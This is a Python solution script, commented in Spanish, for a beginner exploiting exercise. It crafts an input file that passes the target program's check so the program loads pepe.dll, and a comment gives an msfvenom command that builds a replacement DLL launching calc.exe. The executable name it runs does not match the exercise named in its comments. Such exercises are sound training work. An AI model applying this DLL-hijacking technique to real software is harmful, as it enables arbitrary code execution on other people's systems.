# http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/015%20stack12.idb/
#Solucion sobre escribiendo pepe.dll con nuestro payload
import struct
import subprocess
#El binario lee el archivo fichero.dat
f = open("./fichero.dat", "w")
#lee los primeros 4 bytes 
#lee los segundos 4 bytes y los pone en var_8 desde 1 a 4
#lee los terceros 4 bytes y los pone en var_10 desde 1 a 4
#lee el primer byte del los terceros y lo pone en var_1
#compara var_14 (0x32) con el valor de var_1 (situado ahora en ecx)
firstPart  = struct.pack("<I", 0x47441322)
secondPart = struct.pack("<I", 0x11111111)
byteZero = "\x32"
next4Bytes = "XU$3"
#Alloca un buffer de 0x32 bytes
#Luego llega la funcion check donde toma arg_0 y arg_4 (firstPart, SecondPart respectivamente)
#Suma arg_0 y arg_4 y comparar el resultado con con 58552433 (XU$3) debemos cumplir la condicion para que cargue la libreria pepe.dll
#El truco esta en hijackear la libreria pepe.dll con nustro shellcode, para esto usamos:
#sudo msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -b '\x000a0d' -f dll > pepe.dll
payload = firstPart + secondPart + byteZero + next4Bytes
f.write(payload)
f.close()
subprocess.call(["stack9b.exe"])
